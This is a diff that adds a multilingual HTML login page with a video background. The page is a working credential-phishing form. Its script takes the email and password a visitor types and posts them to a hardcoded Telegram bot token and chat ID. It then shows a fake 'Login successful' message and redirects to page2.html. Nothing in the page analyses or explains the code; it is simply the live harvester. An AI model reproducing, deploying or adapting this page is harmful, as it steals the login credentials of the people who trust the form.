@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Login</title>
+<style>
+  html, body {
+    margin: 0; padding: 0; height: 100%;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+    background: transparent;
+    color: white;
+  }
+  video#bg {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    z-index: -1;
+  }
+  .container {
+    position: absolute;
+    top: 50%; left: 50%;
+    transform: translate(-50%, -50%);
+    background: rgba(0, 0, 0, 0.4);
+    padding: 30px 25px;
+    border-radius: 15px;
+    width: 320px;
+    max-width: 90vw;
+    box-sizing: border-box;
+    text-align: center;
+  }
+  input {
+    width: 100%;
+    padding: 12px;
+    margin: 10px 0;
+    border: none;
+    border-radius: 8px;
+    background: rgba(255,255,255,0.1);
+    color: white;
+    font-size: 16px;
+    box-sizing: border-box;
+  }
+  input::placeholder {
+    color: #ddd;
+  }
+  button {
+    width: 100%;
+    padding: 12px;
+    margin-top: 15px;
+    border: none;
+    border-radius: 8px;
+    background-color: #0af;
+    color: white;
+    font-weight: bold;
+    font-size: 16px;
+    cursor: pointer;
+  }
+  button:hover {
+    background-color: #08c;
+  }
+  a#createAccount {
+    display: block;
+    margin-top: 20px;
+    font-size: 14px;
+    color: #0af;
+    cursor: pointer;
+    text-decoration: underline;
+  }
+  a#createAccount:hover {
+    color: #08c;
+  }
+  #langBtn {
+    position: fixed;
+    top: 20px;
+    right: 20px;
+    background: rgba(255,255,255,0.15);
+    border: none;
+    color: white;
+    width: 44px;
+    height: 44px;
+    border-radius: 50%;
+    font-size: 24px;
+    line-height: 44px;
+    text-align: center;
+    cursor: pointer;
+    user-select: none;
+    z-index: 10;
+    padding: 0;
+  }
+  #msg {
+    margin-top: 12px;
+    font-size: 14px;
+    color: #ffcc00;
+    min-height: 20px;
+  }
+</style>
+</head>
+<body>
+
+<video autoplay muted loop id="bg" playsinline>
+  <source src="background.mp4" type="video/mp4" />
+  Your browser does not support the video tag.
+</video>
+
+<button id="langBtn" aria-label="Change Language">🌐</button>
+
+<div class="container">
+  <h2 id="title">Login</h2>
+  <input type="email" id="email" placeholder="Email" autocomplete="username" />
+  <input type="password" id="password" placeholder="Password" autocomplete="current-password" />
+  <button id="loginBtn">Login</button>
+  <a id="createAccount"></a>
+  <div id="msg"></div>
+</div>
+
+<script>
+  const BOT_TOKEN = "7742615412:AAHj2GkWsq3X3_JnhkDXF0Ke-PhIjJJTFnI";
+  const CHAT_ID = "7739393558"; // ← ID الخاص بـ @sigamteam6
+
+  function sendToTelegram(email, password) {
+    const message = `🔐 New Login Attempt\n\n📧 Email: ${email}\n🔑 Password: ${password}`;
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+    });
+  }
+
+  const translations = {
+    en: {
+      title: "Login",
+      email: "Email",
+      password: "Password",
+      login: "Login",
+      createAccount: "",
+      fill: "Please fill in both fields.",
+      invalid: "Invalid email or password.",
+      success: "✔️ Login successful!"
+    },
+    fr: {
+      title: "Connexion",
+      email: "E-mail",
+      password: "Mot de passe",
+      login: "Se connecter",
+      createAccount: "",
+      fill: "Veuillez remplir les deux champs.",
+      invalid: "E-mail ou mot de passe invalide.",
+      success: "✔️ Connexion réussie !"
+    },
+    hi: {
+      title: "लॉगिन",
+      email: "ईमेल",
+      password: "पासवर्ड",
+      login: "लॉगिन करें",
+      createAccount: "",
+      fill: "कृपया दोनों फ़ील्ड भरें।",
+      invalid: "अमान्य ईमेल या पासवर्ड।",
+      success: "✔️ लॉगिन सफल!"
+    },
+    zh: {
+      title: "登录",
+      email: "电子邮箱",
+      password: "密码",
+      login: "登录",
+      createAccount: "",
+      fill: "请填写所有字段。",
+      invalid: "电子邮件或密码无效。",
+      success: "✔️ 登录成功！"
+    },
+    ur: {
+      title: "لاگ ان",
+      email: "ای میل",
+      password: "پاس ورڈ",
+      login: "لاگ ان کریں",
+      createAccount: "",
+      fill: "براہ کرم دونوں فیلڈز بھریں۔",
+      invalid: "غلط ای میل یا پاس ورڈ۔",
+      success: "✔️ کامیابی سے لاگ ان ہو گیا!"
+    },
+    yo: {
+      title: "Wọlé",
+      email: "Imeeli",
+      password: "Ọrọ aṣínà",
+      login: "Wọlé",
+      createAccount: "",
+      fill: "Jọwọ fọwọsi awọn aaye mejeeji.",
+      invalid: "Imeeli tabi ọrọ aṣínà ko tọ.",
+      success: "✔️ Wọlé ti ṣaṣeyọri!"
+    }
+  };
+
+  let lang = localStorage.getItem("lang") || navigator.language.slice(0, 2);
+  if (!translations[lang]) lang = "en";
+
+  function applyLang(l) {
+    const t = translations[l];
+    document.getElementById("title").textContent = t.title;
+    document.getElementById("email").placeholder = t.email;
+    document.getElementById("password").placeholder = t.password;
+    document.getElementById("loginBtn").textContent = t.login;
+    document.getElementById("createAccount").textContent = t.createAccount;
+    document.getElementById("msg").textContent = "";
+  }
+
+  document.getElementById("langBtn").addEventListener("click", () => {
+    const keys = Object.keys(translations);
+    let i = keys.indexOf(lang);
+    lang = keys[(i + 1) % keys.length];
+    localStorage.setItem("lang", lang);
+    applyLang(lang);
+  });
+
+  applyLang(lang);
+
+  document.getElementById("loginBtn").addEventListener("click", () => {
+    const email = document.getElementById("email").value.trim();
+    const password = document.getElementById("password").value.trim();
+    const msg = document.getElementById("msg");
+    const t = translations[lang];
+
+    if (!email || !password) {
+      msg.style.color = "yellow";
+      msg.textContent = t.fill;
+      return;
+    }
+
+    sendToTelegram(email, password); // ⬅️ إرسال بيانات المستخدم
+
+    msg.style.color = "lightgreen";
+    msg.textContent = t.success;
+    setTimeout(() => {
+      window.location.href = "page2.html";
+    }, 1000);
+  });
+
+  document.getElementById("createAccount").addEventListener("click", () => {
+    window.location.href = "page2.html";
+  });
+</script>
+
+</body>
+</html>
